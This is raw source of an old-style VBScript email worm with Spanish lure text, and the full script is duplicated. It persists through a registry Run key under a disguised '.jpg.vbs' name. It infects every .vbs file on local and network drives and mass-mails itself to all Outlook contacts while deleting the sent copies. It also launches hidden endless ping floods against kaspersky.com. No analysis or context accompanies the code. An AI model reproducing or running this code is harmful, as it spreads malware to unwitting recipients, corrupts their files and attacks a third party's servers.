On Error Resume Next
Set yeauxn = CreateObject("Scripting.FileSystemObject")
Set vuulkq = CreateObject("WScript.Shell")
Set win = yeauxn.GetSpecialFolder(0)
Set sys = yeauxn.GetSpecialFolder(1)

copyname = sys&"\Miradadesdeelcoño.jpg.vbs"
yeauxn.GetFile(WScript.ScriptFullName).Copy(copyname)
vuulkq.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Win Commander",copyname

Set fl = yeauxn.OpenTextFile(WScript.ScriptFullName, 1)
virus = fl.ReadAll
fl.Close
infectfile()
Sub infectfile()
On Error Resume Next
Set yeauxn = CreateObject("Scripting.FileSystemObject")
Set xolj = yeauxn.Drives
For Each d In xolj
If d.DriveType = 2 Or d.DriveType = 3 Then
list(d.path&"\")
End If
Next
End Sub

Sub list(doss)
On Error Resume Next
Set yeauxn = CreateObject("Scripting.FileSystemObject")
Set rcly = yeauxn.GetFolder(doss)
Set usyik = rcly.SubFolders
For Each f1 In usyik
infect(f1.Path)
list(f1.Path)
Next
End Sub

Sub infect(doss)
On Error Resume Next
Set yeauxn = CreateObject("Scripting.FileSystemObject")
Set rcly = yeauxn.GetFolder(doss)
Set fc = rcly.Files
For Each f1 In fc
ext = yeauxn.GetExtensionName(f1.Path)
ext = lCase(ext)
If (ext = "vbs") Then
    Set cot = yeauxn.OpenTextFile(f1.Path, 1, False)
    If cot.ReadLine <> "'La Mirada del Coño" Then
    cot.Close
    Set cot = yeauxn.OpenTextFile(f1.Path, 1, False)
    vbsorg = cot.ReadAll()
    cot.Close
    Set inf = yeauxn.OpenTextFile(f1.Path, 2, True)
    inf.WriteLine virus
    inf.WriteLine ""
    inf.WriteLine (vbsorg)
    inf.Close
    End If
End If
Next
End Sub

Set mtob = CreateObject("Outlook.Application")
Set tfkg = mtob.GetNameSpace("MAPI")
For each c In tfkg.AddressLists
If c.AddressEntries.Count <> 0 Then
For d = 1 To c.AddressEntries.Count
Set jtthm = mtob.CreateItem(0)
jtthm.To = c.AddressEntries(d).Address
jtthm.Subject = "Hola, mira esto que te mando, es algo curioso"
jtthm.Body = "Mira el archivo adjunto, es curioso las cosas que se pueden hacer ..."
jtthm.Attachments.Add(copyname)
jtthm.DeleteAfterSubmit = True
If jtthm.To <> "" Then
jtthm.Send
End If
Next
End If
Next

vuulkq.Run ("ping.exe -t -l 20000 www.kaspersky.com"),vbHide
vuulkq.Run (win&"\ping.exe -t -l 20000 www.kaspersky.com"),vbHide






On Error Resume Next
Set yeauxn = CreateObject("Scripting.FileSystemObject")
Set vuulkq = CreateObject("WScript.Shell")
Set win = yeauxn.GetSpecialFolder(0)
Set sys = yeauxn.GetSpecialFolder(1)

copyname = sys&"\Miradadesdeelcoño.jpg.vbs"
yeauxn.GetFile(WScript.ScriptFullName).Copy(copyname)
vuulkq.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Win Commander",copyname

Set fl = yeauxn.OpenTextFile(WScript.ScriptFullName, 1)
virus = fl.ReadAll
fl.Close
infectfile()
Sub infectfile()
On Error Resume Next
Set yeauxn = CreateObject("Scripting.FileSystemObject")
Set xolj = yeauxn.Drives
For Each d In xolj
If d.DriveType = 2 Or d.DriveType = 3 Then
list(d.path&"\")
End If
Next
End Sub

Sub list(doss)
On Error Resume Next
Set yeauxn = CreateObject("Scripting.FileSystemObject")
Set rcly = yeauxn.GetFolder(doss)
Set usyik = rcly.SubFolders
For Each f1 In usyik
infect(f1.Path)
list(f1.Path)
Next
End Sub

Sub infect(doss)
On Error Resume Next
Set yeauxn = CreateObject("Scripting.FileSystemObject")
Set rcly = yeauxn.GetFolder(doss)
Set fc = rcly.Files
For Each f1 In fc
ext = yeauxn.GetExtensionName(f1.Path)
ext = lCase(ext)
If (ext = "vbs") Then
    Set cot = yeauxn.OpenTextFile(f1.Path, 1, False)
    If cot.ReadLine <> "'La Mirada del Coño" Then
    cot.Close
    Set cot = yeauxn.OpenTextFile(f1.Path, 1, False)
    vbsorg = cot.ReadAll()
    cot.Close
    Set inf = yeauxn.OpenTextFile(f1.Path, 2, True)
    inf.WriteLine virus
    inf.WriteLine ""
    inf.WriteLine (vbsorg)
    inf.Close
    End If
End If
Next
End Sub

Set mtob = CreateObject("Outlook.Application")
Set tfkg = mtob.GetNameSpace("MAPI")
For each c In tfkg.AddressLists
If c.AddressEntries.Count <> 0 Then
For d = 1 To c.AddressEntries.Count
Set jtthm = mtob.CreateItem(0)
jtthm.To = c.AddressEntries(d).Address
jtthm.Subject = "Hola, mira esto que te mando, es algo curioso"
jtthm.Body = "Mira el archivo adjunto, es curioso las cosas que se pueden hacer ..."
jtthm.Attachments.Add(copyname)
jtthm.DeleteAfterSubmit = True
If jtthm.To <> "" Then
jtthm.Send
End If
Next
End If
Next

vuulkq.Run ("ping.exe -t -l 20000 www.kaspersky.com"),vbHide
vuulkq.Run (win&"\ping.exe -t -l 20000 www.kaspersky.com"),vbHide





